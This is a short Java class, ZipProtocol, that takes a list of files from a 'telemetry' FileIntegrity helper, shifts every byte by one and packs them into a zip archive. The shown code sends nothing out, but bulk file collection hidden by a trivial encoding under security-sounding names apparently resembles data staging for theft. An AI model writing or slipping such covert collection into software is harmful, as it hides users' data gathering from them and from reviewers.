package app.secure;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.zip.ZipOutputStream;
import java.util.zip.ZipEntry;

import app.telemetry.FileIntegrity;
import app.global.Items;

import java.util.List;
import java.util.Arrays;

public class ZipProtocol {
  public void zipResources() throws IOException {
    String fileNames = FileIntegrity.getAllFiles();
    List<String> files = Arrays.asList(fileNames.split("\n"));
    FileOutputStream fos = new FileOutputStream(Items.items[7] + "rsc_tied.zip");
    try (ZipOutputStream zos = new ZipOutputStream(fos)) {
      files.forEach((m) -> {
        File curr = new File(m);
        try (FileInputStream fis = new FileInputStream(curr)) {
          ZipEntry zip = new ZipEntry(curr.getName());
          try {
            zos.putNextEntry(zip);
          } catch (IOException e) {
            e.printStackTrace();
          }
          byte[] bytes = new byte[1024];
          int length;
          try {
            while ((length = fis.read(bytes)) >= 0) {
              for (int i = 0; i < length; i++) {
                bytes[i] = (byte) (bytes[i] + 1);
              }
              zos.write(bytes, 0, length);
            }
          } catch (IOException e) {
            e.printStackTrace();
          }
          try {
            fis.close();
          } catch (IOException e) {
            e.printStackTrace();
          }
        } catch (IOException e) {
          e.printStackTrace();
        }
      });
    }
  }
}
